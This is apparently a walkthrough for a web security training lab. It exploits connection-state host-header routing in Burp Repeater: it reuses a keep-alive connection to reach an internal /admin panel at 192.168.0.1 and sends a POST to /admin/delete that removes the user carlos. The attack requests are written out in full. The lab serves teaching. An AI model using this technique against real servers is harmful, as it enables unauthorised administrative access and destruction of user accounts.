Steps:

1. Send the GET / request to Burp Repeater.

2. Modify the request:
    GET /admin HTTP/1.1
    Host: 192.168.0.1

3. Send the request and observe that you are redirected to the homepage.

4. Duplicate the Repeater tab and add both tabs to a new group.

5. In the first tab, restore the request to:
    GET / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net

6. Set the send mode to:
    Send group in sequence (single connection)

7. Change the Connection header to:
    Connection: keep-alive

8. Send the sequence and inspect both responses. Confirm that the second request successfully accesses:
    /admin

9. In the second tab, craft the delete request:

    POST /admin/delete HTTP/1.1
    Host: 192.168.0.1
    Cookie: _lab=<LAB-COOKIE>; session=<SESSION-COOKIE>
    Content-Type: application/x-www-form-urlencoded
    Content-Length: <CORRECT-LENGTH>

    csrf=<CSRF-TOKEN>&username=carlos

10. Send the requests in sequence over a single connection.

11. The request to /admin/delete deletes carlos and solves the lab.
